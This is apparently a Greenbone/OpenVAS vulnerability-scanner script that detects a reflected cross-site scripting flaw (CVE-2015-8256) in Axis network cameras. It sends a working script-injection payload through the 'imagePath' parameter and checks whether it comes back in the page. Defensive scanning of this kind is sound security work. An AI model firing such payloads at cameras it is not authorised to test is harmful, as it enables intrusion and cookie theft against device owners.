if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807676" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2015-8256" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2016-04-20 15:15:28 +0530 (Wed, 20 Apr 2016)" );
	script_name( "Axis Network Cameras Multiple Cross-site Scripting Vulnerabilities" );
	script_tag( name: "summary", value: "The host is running Axis Network Cameras and is
  prone to multiple cross-site scripting vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check
  whether it is possible to write a file into the server." );
	script_tag( name: "insight", value: "The flaws exist due to an improper sanitization
  of 'imagePath' parameter in'view.shtml' script." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to
  run arbitrary code on a victim's browser and computer if combined with another
  flaws in the same devices." );
	script_tag( name: "affected", value: "Multiple Axis Network products." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/39683" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
axis_port = http_get_port( default: 80 );
req = http_get( item: "/view/view.shtml", port: axis_port );
res = http_send_recv( port: axis_port, data: req );
if(res && ContainsString( res, ">Live view  - AXIS" ) && ContainsString( res, "Camera<" )){
	url = "/view/view.shtml?imagePath=0WLL</script><script>alert" + "(document.cookie)</script><!--";
	if(http_vuln_check( port: axis_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>", extra_check: make_list( "Live view  - AXIS",
		 "camera" ) )){
		report = http_report_vuln_url( port: axis_port, url: url );
		security_message( port: axis_port, data: report );
		exit( 0 );
	}
}

